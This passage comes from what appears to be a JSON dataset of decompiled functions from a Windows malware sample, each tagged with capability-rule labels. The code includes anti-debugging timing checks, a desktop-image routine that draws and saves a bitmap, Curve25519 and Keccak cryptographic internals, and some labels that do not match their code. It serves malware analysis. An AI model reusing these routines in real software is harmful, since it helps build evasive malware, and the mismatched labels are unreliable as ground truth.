(arg_8h_00 != 0) {\n        fcn.0040536d(arg_8h_00);\n    }\ncode_r0x00403ba9:\n    if (var_18h != 0) {\n        fcn.0040536d(var_18h);\n    }\n    (**0x413cd4)(arg_8h);\n    return uVar1;\n}\n",
        "token_count": 813
    },
    "0040480e": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __cdecl fcn.0040480e(uint arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    uint16_t uVar1;\n    int32_t iVar2;\n    int32_t *piVar3;\n    int32_t iVar4;\n    int32_t iVar5;\n    uint var_2ch;\n    int32_t var_28h;\n    int32_t var_24h;\n    int16_t var_1ch;\n    uint var_1ah;\n    int32_t var_14h;\n    uint var_eh;\n    int32_t var_ah;\n    uint var_4h;\n    \n    iVar5 = 0x18;\n    iVar2 = (**0x413d58)(arg_8h, 0x18, &var_2ch);\n    if (iVar2 == 0) {\n        return;\n    }\n    uVar1 = var_1ah * var_1ch;\n    iVar2 = 1;\n    if ((((uVar1 != 1) && (iVar2 = 4,  4 < uVar1)) && (iVar2 = 8,  8 < uVar1)) && (iVar2 = 0x10,  0x10 < uVar1)) {\n        if (uVar1 < 0x19) {\n            iVar4 = 0x28;\n            goto code_r0x0040487a;\n        }\n        iVar2 = 0x20;\n    }\n    iVar4 = (1 << (iVar2 & 0x1f)) * 4 + 0x28;\n    iVar5 = iVar2;\ncode_r0x0040487a:\n    piVar3 = (**0x413c60)(0x40, iVar4);\n    *piVar3 = 0x28;\n    piVar3[1] = var_28h;\n    piVar3[2] = var_24h;\n    *(piVar3 + 3) = var_1ch;\n    *(piVar3 + 0xe) = var_1ah;\n    if (iVar5 < 0x18) {\n        piVar3[8] = 1 << (iVar5 & 0x1f);\n    }\n    piVar3[4] = 0;\n    piVar3[9] = 0;\n    iVar5 = (piVar3[1] + 7 + (piVar3[1] + 7 >> 0x1f & 7U) >> 3) * iVar5 * piVar3[2];\n    piVar3[5] = iVar5;\n    iVar5 = (**0x413ce4)(0, iVar5);\n    if (((iVar5 != 0) && (iVar2 = (**0x413d34)(arg_ch, arg_8h, 0, *(piVar3 + 2), iVar5, piVar3, 0),  iVar2 != 0)) &&\n       (iVar2 = (**0x413c10)(arg_10h, 0xc0000000, 0, 0, 2, 0x80, 0),  iVar2 != -1)) {\n        var_14h._0_2_ = 0x4d42;\n        *NULL = *piVar3 + piVar3[5] + piVar3[8] * 4 + 0xe;\n        var_eh = 0;\n        var_ah = *piVar3 + piVar3[8] * 4 + 0xe;\n        iVar4 = (**0x413da0)(iVar2, &var_14h, 0xe, &var_4h, 0);\n        if (((iVar4 == 0) || (iVar4 = (**0x413da0)(iVar2, piVar3, piVar3[8] * 4 + 0x28, &var_4h, 0),  iVar4 == 0)) ||\n           (iVar4 = (**0x413da0)(iVar2, iVar5, piVar3[5], &var_4h, 0),  iVar4 == 0)) {\n            fcn.0040536d(iVar2);\n        }\n        else {\n            fcn.0040536d(iVar2);\n            (**0x413da4)(iVar5);\n        }\n    }\n    return;\n}\n",
        "token_count": 962
    },
    "00404ff9": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nbool fcn.00404ff9(void)\n\n{\n    uint uVar1;\n    int32_t iVar2;\n    uint lpConsoleScreenBufferInfo;\n    uint var_10h;\n    \n    uVar1 = (*_sym.imp.KERNEL32.dll_LoadLibraryA)(\"ntdll\", \"_vsnwprintf\");\n    *0x421354 = (*_sym.imp.KERNEL32.dll_GetProcAddress)(uVar1);\n    if (((*0x421354 != 0) && (*0x421358 = (*_sym.imp.KERNEL32.dll_GetStdHandle)(0xfffffff5),  *0x421358 != -1)) &&\n       (iVar2 = (*_sym.imp.KERNEL32.dll_GetConsoleScreenBufferInfo)(*0x421358, &lpConsoleScreenBufferInfo),  iVar2 != 0)\n       ) {\n        *0x42135c = var_10h;\n        (*_sym.imp.KERNEL32.dll_InitializeCriticalSection)(0x4216a0);\n        *0x421360 = (*_sym.imp.KERNEL32.dll_CreateFileW)(L\"DBG_LOG.TXT\", 4, 1, 0, 4, 0, 0);\n        return *0x421360 != -1;\n    }\n    return false;\n}\n",
        "token_count": 281
    },
    "00405e1e": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.00405e1e(uint32_t arg_8h, uint32_t arg_ch)\n\n{\n    uint32_t uVar1;\n    int32_t iVar2;\n    uint32_t uVar3;\n    \n    uVar1 = arg_8h;\n    if ((arg_8h <= arg_ch) && (iVar2 = fcn.004076f1(&arg_8h, 4),  iVar2 != 0)) {\n        uVar3 = (arg_ch - uVar1) + 1;\n        if ((uVar1 == 0) && (arg_ch == 0xffffffff)) {\n            uVar3 = arg_ch - uVar1;\n        }\n        return uVar1 + arg_8h % uVar3;\n    }\n    return 0;\n}\n",
        "token_count": 177
    },
    "0040629f": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n\nuint __cdecl fcn.0040629f(char *arg_8h)\n\n{\n    ulong uVar1;\n    char cVar2;\n    char cVar3;\n    uint32_t uVar4;\n    uint32_t arg_8h_00;\n    uint32_t uVar5;\n    uint32_t arg_8h_01;\n    uint32_t uVar6;\n    int32_t iVar7;\n    int32_t iVar8;\n    uint32_t uVar9;\n    int32_t iVar10;\n    uint32_t uVar11;\n    bool bVar12;\n    uint var_10h;\n    uint var_8h;\n    uint var_1h;\n    \n    iVar10 = 0;\n    do {\n        uVar1 = rdtsc();\n        iVar8 = uVar1 >> 0x20;\n        uVar4 = uVar1;\n        fcn.00406349();\n        uVar1 = rdtsc();\n        arg_8h_00 = uVar1 - uVar4;\n        iVar7 = ((uVar1 >> 0x20) - iVar8) - (uVar1 < uVar4);\n        fcn.00406349();\n        uVar1 = rdtsc();\n        uVar5 = uVar1 - arg_8h_00;\n        arg_8h_01 = uVar5 - uVar4;\n        if ((iVar7 == 0) && ((((uVar1 >> 0x20) - iVar7) - (uVar1 < arg_8h_00)) - iVar8 == uVar5 < uVar4)) {\n            uVar9 = -(arg_8h_00 < arg_8h_01) >> 0x1f;\n            uVar6 = -(arg_8h_00 < arg_8h_01) ^ uVar9;\n            uVar11 = arg_8h_00 - arg_8h_01 ^ uVar9;\n            uVar4 = uVar11 < uVar9;\n            uVar5 = uVar6 - uVar9;\n            bVar12 = uVar5 - uVar4 < 0;\n            if ((!bVar12) &&\n               ((uVar5 != uVar4 && (SBORROW4(uVar6, uVar9) != SBORROW4(uVar5, uVar4)) == bVar12 ||\n                (0x3f < uVar11 - uVar9)))) {\n                cVar2 = fcn.004061d3(arg_8h_00);\n                cVar3 = fcn.004061d3(arg_8h_01);\n                if (cVar3 != cVar2) {\n                    *arg_8h = cVar2;\n                    return 1;\n                }\n            }\n        }\n        iVar10 = iVar10 + 1;\n    } while (iVar10 < 0x80);\n    return 0;\n}\n",
        "token_count": 647
    },
    "004081ff": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nuint __cdecl\nfcn.004081ff(int32_t arg_8h, uint arg_ch, uint arg_10h, uint arg_14h, uint arg_18h, uint arg_1ch, uint arg_20h)\n\n{\n    int32_t iVar1;\n    \n    *(arg_8h + 0xc) = 0;\n    *(arg_8h + 8) = 0;\n    iVar1 = (**0x413c10)(arg_ch, arg_18h, arg_1ch, 0, arg_20h, 0x48000000, 0);\n    *(arg_8h + 0x14) = iVar1;\n    if (iVar1 != -1) {\n        iVar1 = fcn.00406c56(arg_ch);\n        *(arg_8h + 0x18) = iVar1;\n        if (iVar1 != 0) {\n            *(arg_8h + 0x20) = arg_10h;\n            *(arg_8h + 0x24) = arg_14h;\n            return 1;\n        }\n        fcn.0040536d(*(arg_8h + 0x14));\n    }\n    return 0;\n}\n",
        "token_count": 268
    },
    "004084b5": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.004084b5(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h, uint arg_18h)\n\n{\n    int32_t iVar1;\n    \n    iVar1 = (**0x413c10)(arg_8h, arg_ch, arg_10h, 0, arg_14h, arg_18h, 0);\n    if (iVar1 == -1) {\n        iVar1 = 0;\n    }\n    return iVar1;\n}\n",
        "token_count": 115
    },
    "004061d3": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9",
            "check for kernel debugger via shared user data structure/13c690ddb28d4ec98b07cd3883582187",
            "hash data using aphash/5d19edf9cd984ed983ffade7fcae10d0"
        ],
        "decompiled_code": "\nuint32_t __cdecl fcn.004061d3(uint32_t arg_8h)\n\n{\n    uint32_t uVar1;\n    uint16_t uVar2;\n    uint32_t uVar3;\n    uint var_ch;\n    int32_t var_8h;\n    uint var_4h;\n    \n    uVar2 = arg_8h;\n    uVar3 = arg_8h >> 0x10;\n    uVar1 = 0;\n    var_8h = 0x40;\n    do {\n        uVar1 = uVar1 + 0x9e3779b9;\n        uVar2 = uVar2 + (uVar1 + uVar3 ^ uVar3 >> 5 ^ uVar3 << 4);\n        arg_8h = uVar2;\n        uVar3 = uVar3 + (uVar1 + uVar2 ^ uVar2 >> 5 ^ uVar2 * 0x10);\n        var_8h = var_8h + -1;\n    } while (var_8h != 0);\n    return uVar1 & 0xffff0000 | (uVar2 & 0xe000) >> 5 | arg_8h & 1;\n}\n",
        "token_count": 271
    },
    "0040707e": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0040707e(int32_t arg_8h, uint8_t *arg_ch)\n\n{\n    uint8_t *puVar1;\n    uint8_t uVar2;\n    uint8_t *puVar3;\n    uint uVar4;\n    uint8_t *puVar5;\n    uint8_t *var_4h;\n    \n    puVar3 = fcn.00406c91(arg_8h);\n    if ((puVar3 & 1) == 0) {\n        if (puVar3 != NULL) {\n            puVar5 = arg_8h + 1;\n            var_4h = arg_ch;\n            do {\n                puVar1 = puVar5 + -1;\n                uVar2 = *puVar5;\n                if ((0xf < *(*puVar1 + 0x40fe08)) || (0xf < *(uVar2 + 0x40fe08))) {\n                    fcn.0040524d(arg_ch, 0, puVar3 >> 1);\n                    return 0;\n                }\n                puVar5 = puVar5 + 2;\n                *var_4h = *(*puVar1 + 0x40fe08) << 4 | *(uVar2 + 0x40fe08);\n                var_4h = var_4h + 1;\n            } while (puVar5 + (-1 - arg_8h) < puVar3);\n        }\n        uVar4 = 1;\n    }\n    else {\n        uVar4 = 0;\n    }\n    return uVar4;\n}\n",
        "token_count": 346
    },
    "00407642": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9",
            "check for kernel debugger via shared user data structure/13c690ddb28d4ec98b07cd3883582187",
            "hash data using aphash/5d19edf9cd984ed983ffade7fcae10d0"
        ],
        "decompiled_code": "\nuint32_t __cdecl fcn.00407642(uint32_t arg_8h, uint8_t *arg_ch, int32_t arg_10h)\n\n{\n    int32_t iVar1;\n    \n    arg_8h = ~arg_8h;\n    if (arg_10h != 0) {\n        do {\n            arg_10h = arg_10h + -1;\n            arg_8h = arg_8h ^ *arg_ch;\n            arg_ch = arg_ch + 1;\n            iVar1 = 8;\n            do {\n                arg_8h = arg_8h >> 1 ^ ~(arg_8h & 1) + 1 & 0xedb88320;\n                iVar1 = iVar1 + -1;\n            } while (iVar1 != 0);\n        } while (arg_10h != 0);\n    }\n    return ~arg_8h;\n}\n",
        "token_count": 197
    },
    "0040acb8": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0040acb8(uchar *arg_8h, int32_t arg_ch)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    uint32_t uVar3;\n    int32_t iVar4;\n    uint32_t uVar5;\n    uint32_t uVar6;\n    int32_t iVar7;\n    ulong uVar8;\n    uint arg_ch_00;\n    int32_t var_40h;\n    int32_t var_3ch;\n    int32_t var_38h;\n    int32_t var_34h;\n    int32_t var_30h;\n    uint var_2ch;\n    int32_t var_28h;\n    int32_t var_24h;\n    int32_t var_20h;\n    uint32_t var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint32_t var_8h;\n    uint var_4h;\n    \n    iVar4 = 0;\n    do {\n        (&var_40h)[iVar4] = *(arg_ch + iVar4 * 8);\n        iVar4 = iVar4 + 1;\n    } while (iVar4 < 10);\n    iVar7 = 2;\n    iVar4 = iVar7;\n    do {\n        uVar6 = 0;\n        do {\n            iVar1 = (&var_40h)[uVar6];\n            if ((uVar6 & 1) == 0) {\n                uVar5 = iVar1 >> 0x1f & iVar1 >> 0x1a;\n                iVar2 = uVar5 * -0x4000000;\n            }\n            else {\n                uVar5 = iVar1 >> 0x1f & iVar1 >> 0x19;\n                iVar2 = uVar5 * -0x2000000;\n            }\n            (&var_3ch)[uVar6] = (&var_3ch)[uVar6] + uVar5;\n            (&var_40h)[uVar6] = iVar2 + iVar1;\n            uVar6 = uVar6 + 1;\n        } while (uVar6 < 9);\n        uVar6 = var_1ch >> 0x1f & var_1ch >> 0x19;\n        var_1ch = var_1ch + uVar6 * -0x2000000;\n        var_40h = var_40h + uVar6 * 0x13;\n        iVar4 = iVar4 + -1;\n    } while (iVar4 != 0);\n    uVar6 = var_40h >> 0x1f & var_40h >> 0x1a;\n    var_3ch = var_3ch + uVar6;\n    var_40h = var_40h + uVar6 * -0x4000000;\n    do {\n        uVar6 = 0;\n        do {\n            uVar5 = (&var_40h)[uVar6];\n            if ((uVar6 & 1) == 0) {\n                iVar4 = 0x1a;\n                uVar3 = uVar5 & 0x3ffffff;\n            }\n            else {\n                iVar4 = 0x19;\n                uVar3 = uVar5 & 0x1ffffff;\n            }\n            (&var_3ch)[uVar6] = (&var_3ch)[uVar6] + (uVar5 >> iVar4);\n            (&var_40h)[uVar6] = uVar3;\n            uVar6 = uVar6 + 1;\n        } while (uVar6 < 9);\n        iVar4 = var_1ch >> 0x19;\n        var_1ch = var_1ch & 0x1ffffff;\n        iVar4 = var_40h + iVar4 * 0x13;\n        var_40h = iVar4;\n        iVar7 = iVar7 + -1;\n    } while (iVar7 != 0);\n    uVar6 = 1;\n    var_8h = 1;\n    var_4h = 1;\n    do {\n        if ((uVar6 & 1) == 0) {\n            arg_ch_00 = 0x3ffffff;\n        }\n        else {\n            arg_ch_00 = 0x1ffffff;\n        }\n        uVar8 = fcn.0040c02d((&var_40h)[uVar6], arg_ch_00);\n        uVar5 = uVar8 >> 0x20 & uVar8;\n        uVar6 = uVar6 + 1;\n    } while (uVar6 < 10);\n    var_40h = iVar4 - (uVar5 & 0x3ffffed);\n    do {\n        if ((var_8h & 1) == 0) {\n            uVar6 = uVar5 & 0x3ffffff;\n        }\n        else {\n            uVar6 = uVar5 & 0x1ffffff;\n        }\n        (&var_40h)[var_8h] = (&var_40h)[var_8h] - uVar6;\n        var_8h = var_8h + 1;\n    } while (var_8h < 10);\n    var_34h = var_34h << 5;\n    var_30h = var_30h << 6;\n    var_28h = var_28h * 2;\n    var_24h = var_24h << 3;\n    var_20h = var_20h << 4;\n    iVar4 = var_1ch << 6;\n    arg_8h[1] = var_40h >> 8;\n    arg_8h[2] = var_40h >> 0x10;\n    iVar7 = var_3ch << 2;\n    var_38h = var_38h << 3;\n    arg_8h[4] = iVar7 >> 8;\n    arg_8h[5] = iVar7 >> 0x10;\n    arg_8h[7] = var_38h >> 8;\n    *arg_8h = var_40h;\n    arg_8h[8] = var_38h >> 0x10;\n    arg_8h[3] = var_40h >> 0x18 | iVar7;\n    arg_8h[10] = var_34h >> 8;\n    arg_8h[0xb] = var_34h >> 0x10;\n    arg_8h[6] = iVar7 >> 0x18 | var_38h;\n    arg_8h[0xd] = var_30h >> 8;\n    arg_8h[0xe] = var_30h >> 0x10;\n    arg_8h[0xc] = var_34h >> 0x18 | var_30h;\n    arg_8h[0x11] = var_2ch >> 8;\n    arg_8h[0xf] = var_30h >> 0x18;\n    arg_8h[0x10] = var_2ch;\n    arg_8h[9] = var_38h >> 0x18 | var_34h;\n    arg_8h[0x12] = var_2ch >> 0x10;\n    arg_8h[0x14] = var_28h >> 8;\n    arg_8h[0x15] = var_28h >> 0x10;\n    arg_8h[0x13] = var_2ch >> 0x18 | var_28h;\n    arg_8h[0x17] = var_24h >> 8;\n    arg_8h[0x18] = var_24h >> 0x10;\n    arg_8h[0x16] = var_28h >> 0x18 | var_24h;\n    arg_8h[0x1a] = var_20h >> 8;\n    arg_8h[0x1b] = var_20h >> 0x10;\n    arg_8h[0x19] = var_24h >> 0x18 | var_20h;\n    arg_8h[0x1d] = iVar4 >> 8;\n    arg_8h[0x1c] = var_20h >> 0x18 | iVar4;\n    arg_8h[0x1e] = iVar4 >> 0x10;\n    arg_8h[0x1f] = iVar4 >> 0x18;\n    return;\n}\n",
        "token_count": 1910
    },
    "0040dbe2": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nfloat10 __cdecl fcn.0040dbe2(uint noname_0, uint noname_1, uint32_t arg_10h)\n\n{\n    float10 fVar1;\n    \n    if (arg_10h == 0) {\n        fVar1 = 1;\n    }\n    else {\n        fVar1 = fcn.0040dbe2(noname_0, noname_1, arg_10h / 2);\n        if ((arg_10h & 1) == 0) {\n            fVar1 = fVar1 * fVar1;\n        }\n        else if (arg_10h < 1) {\n            fVar1 = (fVar1 * fVar1) / CONCAT44(noname_1, noname_0);\n        }\n        else {\n            fVar1 = fVar1 * CONCAT44(noname_1, noname_0) * fVar1;\n        }\n    }\n    return fVar1;\n}\n",
        "token_count": 209
    },
    "00404ac8": {
        "rules": [
            "decompress data using aPLib/06666ba0b6a14a5481e4ee6eb664d454"
        ],
        "decompiled_code": "\nvoid fcn.00404ac8(void)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    uint32_t uVar4;\n    uint32_t uVar5;\n    uint32_t uVar6;\n    int32_t iVar7;\n    int32_t iVar8;\n    uint uVar9;\n    uint arg_10h;\n    uint var_34h;\n    int32_t var_30h;\n    int32_t var_2ch;\n    int32_t var_28h;\n    int32_t var_24h;\n    int32_t var_20h;\n    int32_t var_1ch;\n    int32_t var_18h;\n    int32_t var_14h;\n    int32_t var_10h;\n    int32_t var_ch;\n    int32_t var_8h;\n    int32_t var_4h;\n    \n    arg_10h = 0x4216a0;\n    (*_sym.imp.KERNEL32.dll_EnterCriticalSection)();\n    uVar9 = 7;\n    fcn.00405082(7, L\"[DBG] \", arg_10h);\n    fcn.00405082(8, L\"make desktop image\\r\\n\", uVar9);\n    (*_sym.imp.KERNEL32.dll_LeaveCriticalSection)(0x4216a0);\n    iVar1 = (**0x413d28)(0);\n    if (iVar1 != 0) {\n        var_1ch = iVar1;\n        iVar2 = (**0x413dfc)(iVar1);\n        var_10h = iVar2;\n        if (iVar2 != 0) {\n            iVar3 = (**0x413d24)(iVar1, 8);\n            var_ch = 10;\n            var_18h = iVar3;\n            var_4h = (**0x413d24)(iVar1, 10);\n            var_14h = (**0x413d54)(iVar1, iVar3, var_4h);\n            iVar8 = iVar2;\n            if (var_14h != 0) {\n                (**0x413cf0)(iVar2, var_14h);\n                uVar9 = (**0x413d24)(iVar1, 0x5a);\n                var_20h = (**0x413c74)(0x12, uVar9, 0x48);\n                var_20h = -var_20h;\n                var_24h = (**0x413c8c)(var_20h, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 4, 0, 0);\n                if (var_24h != 0) {\n                    (**0x413cf0)(iVar2, var_24h);\n                    (**0x413de0)(iVar2, 1);\n                    (**0x413d78)(iVar2, 0xffffff);\n                    uVar9 = (**0x413c4c)(2);\n                    var_34h = 0;\n                    var_30h = 0;\n                    var_28h = var_4h;\n                    var_2ch = iVar3;\n                    (**0x413e48)(iVar2, &var_34h, uVar9);\n                    if ((0 < (var_4h * iVar3) / var_ch) && (var_8h = 0,  iVar7 = var_4h,  0 < iVar3)) {\n                        do {\n                            var_ch = 0;\n                            if (0 < iVar7) {\n                                do {\n                                    uVar4 = fcn.00405e1e(0, 0xffffffff);\n                                    uVar5 = fcn.00405e1e(0, 0xffffffff);\n                                    uVar6 = fcn.00405e1e(0, 0xffffffff);\n                                    iVar1 = var_ch;\n                                    (**0x413ce0)(iVar2, var_8h, var_ch, \n                                                 uVar6 % 0x1e | (uVar5 % 0x1e | uVar4 % 200 << 8) << 8);\n                                    var_ch = iVar1 + 1;\n                                    iVar7 = var_4h;\n                                    iVar3 = var_18h;\n                                } while (var_ch < var_4h);\n                            }\n                            var_8h = var_8h + 1;\n                            iVar1 = var_1ch;\n                            iVar8 = var_10h;\n                        } while (var_8h < iVar3);\n                    }\n                    var_30h = (var_28h / 2 - var_4h / 2) - var_20h;\n                    (**0x413e34)(iVar8, *0x4215e4, 0xffffffff, &var_34h, 0x11);\n                    iVar2 = fcn.004049c3();\n                    if (iVar2 != 0) {\n                        fcn.0040480e(var_14h, iVar1, iVar2);\n                        (**0x413d50)(0x14, 0, iVar2, 3);\n                        fcn.004051e4(iVar2);\n                    }\n                    (**0x413d40)(var_24h);\n                }\n                (**0x413d40)(var_14h);\n            }\n            (**0x413c94)(iVar8);\n        }\n        (**0x413c18)(0, iVar1);\n    }\n    return;\n}\n",
        "token_count": 1197
    },
    "00405d5a": {
        "rules": [
            "decompress data using aPLib/06666ba0b6a14a5481e4ee6eb664d454"
        ],
        "decompiled_code": "\nushort fcn.00405d5a(void)\n\n{\n    int32_t in_FS_OFFSET;\n    \n    return CONCAT11(*(*(in_FS_OFFSET + 0x30) + 0xa4), *(*(in_FS_OFFSET + 0x30) + 0xa8));\n}\n",
        "token_count": 61
    },
    "0040af89": {
        "rules": [
            "decompress data using aPLib/06666ba0b6a14a5481e4ee6eb664d454"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0040af89(uint32_t *arg_8h, uint8_t *arg_ch)\n\n{\n    uint8_t uVar1;\n    uint8_t uVar2;\n    uint16_t uVar3;\n    unkuint3 Var4;\n    \n    uVar3 = *(arg_ch + 2);\n    uVar1 = *arg_ch;\n    uVar2 = arg_ch[1];\n    arg_8h[1] = 0;\n    *arg_8h = (uVar3 & 0x3ff) << 0x10 | uVar1 | uVar2 << 8;\n    Var4 = *(arg_ch + 4);\n    uVar1 = arg_ch[3];\n    arg_8h[3] = 0;\n    arg_8h[2] = (Var4 & 0x7ffff) << 6 | uVar1 >> 2;\n    arg_8h[4] = (*(arg_ch + 7) & 0x1fffff) << 5 | arg_ch[6] >> 3;\n    arg_8h[5] = 0;\n    Var4 = *(arg_ch + 10);\n    uVar1 = arg_ch[9];\n    arg_8h[7] = 0;\n    arg_8h[6] = (Var4 & 0x3fffff) << 3 | uVar1 >> 5;\n    Var4 = *(arg_ch + 0xd);\n    uVar1 = arg_ch[0xc];\n    arg_8h[9] = 0;\n    arg_8h[8] = Var4 << 2 | uVar1 >> 6;\n    arg_8h[10] = (*(arg_ch + 0x12) & 0x1ff) << 0x10 | arg_ch[0x10] | arg_ch[0x11] << 8;\n    arg_8h[0xb] = 0;\n    Var4 = *(arg_ch + 0x14);\n    uVar1 = arg_ch[0x13];\n    arg_8h[0xd] = 0;\n    arg_8h[0xc] = (Var4 & 0x7ffff) << 7 | uVar1 >> 1;\n    Var4 = *(arg_ch + 0x17);\n    uVar1 = arg_ch[0x16];\n    arg_8h[0xf] = 0;\n    arg_8h[0xe] = (Var4 & 0xfffff) << 5 | uVar1 >> 3;\n    arg_8h[0x10] = (*(arg_ch + 0x1a) & 0x3fffff) << 4 | arg_ch[0x19] >> 4;\n    arg_8h[0x11] = 0;\n    Var4 = *(arg_ch + 0x1d);\n    uVar1 = arg_ch[0x1c];\n    arg_8h[0x13] = 0;\n    arg_8h[0x12] = (Var4 & 0x7fffff) << 2 | uVar1 >> 6;\n    return;\n}\n",
        "token_count": 707
    },
    "0040c02d": {
        "rules": [
            "decompress data using aPLib/06666ba0b6a14a5481e4ee6eb664d454"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.0040c02d(uint32_t arg_8h, uint32_t arg_ch)\n\n{\n    uint32_t uVar1;\n    \n    uVar1 = ~(arg_8h ^ arg_ch) & ~(arg_8h ^ arg_ch) << 0x10;\n    uVar1 = uVar1 & uVar1 << 8;\n    uVar1 = uVar1 & uVar1 << 4;\n    uVar1 = uVar1 & uVar1 << 2;\n    return (uVar1 * 2 & uVar1) >> 0x1f;\n}\n",
        "token_count": 138
    },
    "0040c1e2": {
        "rules": [
            "decompress data using aPLib/06666ba0b6a14a5481e4ee6eb664d454"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0040c1e2(uint32_t *arg_8h)\n\n{\n    uint32_t *puVar1;\n    uint32_t uVar2;\n    uint32_t uVar3;\n    uint32_t uVar4;\n    uint32_t uVar5;\n    uint32_t uVar6;\n    uint32_t uVar7;\n    uint32_t uVar8;\n    uint32_t uVar9;\n    uint32_t uVar10;\n    uint32_t uVar11;\n    uint32_t uVar12;\n    uint32_t uVar13;\n    uint32_t *var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    var_28h = 0x4128f0;\n    do {\n        uVar9 = arg_8h[4] ^ arg_8h[0xe] ^ arg_8h[0x18] ^ arg_8h[0x22] ^ arg_8h[0x2c];\n        uVar2 = *arg_8h ^ arg_8h[10] ^ arg_8h[0x14] ^ arg_8h[0x1e] ^ arg_8h[0x28];\n        uVar4 = arg_8h[1] ^ arg_8h[0xb] ^ arg_8h[0x15] ^ arg_8h[0x1f] ^ arg_8h[0x29];\n        uVar7 = arg_8h[5] ^ arg_8h[0xf] ^ arg_8h[0x19] ^ arg_8h[0x23] ^ arg_8h[0x2d];\n        uVar13 = arg_8h[8] ^ arg_8h[0x12] ^ arg_8h[0x1c] ^ arg_8h[0x26] ^ arg_8h[0x30];\n        uVar10 = arg_8h[6] ^ arg_8h[0x10] ^ arg_8h[0x1a] ^ arg_8h[0x24] ^ arg_8h[0x2e];\n        uVar3 = arg_8h[2] ^ arg_8h[0xc] ^ arg_8h[0x16] ^ arg_8h[0x20] ^ arg_8h[0x2a];\n        uVar5 = arg_8h[3] ^ arg_8h[0xd] ^ arg_8h[0x17] ^ arg_8h[0x21] ^ arg_8h[0x2b];\n        uVar8 = arg_8h[7] ^ arg_8h[0x11] ^ arg_8h[0x1b] ^ arg_8h[0x25] ^ arg_8h[0x2f];\n        uVar11 = arg_8h[9] ^ arg_8h[0x13] ^ arg_8h[0x1d] ^ arg_8h[0x27] ^ arg_8h[0x31];\n        uVar6 = uVar5 << 1 | uVar3 >> 0x1f;\n        uVar12 = uVar5 >> 0x1f | uVar3 * 2;\n        *arg_8h = uVar12 ^ *arg_8h ^ uVar13;\n        arg_8h[1] = uVar6 ^ arg_8h[1] ^ uVar11;\n        arg_8h[10] = arg_8h[10] ^ uVar12 ^ uVar13;\n        arg_8h[0xb] = arg_8h[0xb] ^ uVar6 ^ uVar11;\n        arg_8h[0x14] = uVar12 ^ arg_8h[0x14] ^ uVar13;\n        arg_8h[0x15] = uVar6 ^ arg_8h[0x15] ^ uVar11;\n        arg_8h[0x1e] = uVar12 ^ arg_8h[0x1e] ^ uVar13;\n        arg_8h[0x1f] = uVar6 ^ arg_8h[0x1f] ^ uVar11;\n        arg_8h[0x28] = uVar12 ^ arg_8h[0x28] ^ uVar13;\n        arg_8h[0x29] = uVar6 ^ arg_8h[0x29] ^ uVar11;\n        uVar6 = uVar7 << 1 | uVar9 >> 0x1f;\n        uVar12 = uVar7 >> 0x1f | uVar9 * 2;\n        arg_8h[2] = uVar12 ^ arg_8h[2] ^ uVar2;\n        arg_8h[3] = uVar6 ^ arg_8h[3] ^ uVar4;\n        arg_8h[0xc] = uVar12 ^ arg_8h[0xc] ^ uVar2;\n        arg_8h[0xd] = uVar6 ^ arg_8h[0xd] ^ uVar4;\n        arg_8h[0x16] = arg_8h[0x16] ^ uVar12 ^ uVar2;\n        arg_8h[0x17] = arg_8h[0x17] ^ uVar6 ^ uVar4;\n        arg_8h[0x20] = arg_8h[0x20] ^ uVar12 ^ uVar2;\n        arg_8h[0x21] = arg_8h[0x21] ^ uVar6 ^ uVar4;\n        arg_8h[0x2a] = arg_8h[0x2a] ^ uVar12 ^ uVar2;\n        arg_8h[0x2b] = arg_8h[0x2b] ^ uVar6 ^ uVar4;\n        uVar6 = uVar8 << 1 | uVar10 >> 0x1f;\n        uVar12 = uVar8 >> 0x1f | uVar10 * 2;\n        arg_8h[4] = uVar12 ^ arg_8h[4] ^ uVar3;\n        arg_8h[5] = uVar6 ^ arg_8h[5] ^ uVar5;\n        arg_8h[0xe] = uVar12 ^ arg_8h[0xe] ^ uVar3;\n        arg_8h[0xf] = uVar6 ^ arg_8h[0xf] ^ uVar5;\n        arg_8h[0x18] = uVar12 ^ arg_8h[0x18] ^ uVar3;\n        arg_8h[0x19] = uVar6 ^ arg_8h[0x19] ^ uVar5;\n        arg_8h[0x22] = uVar12 ^ arg_8h[0x22] ^ uVar3;\n        arg_8h[0x23] = uVar6 ^ 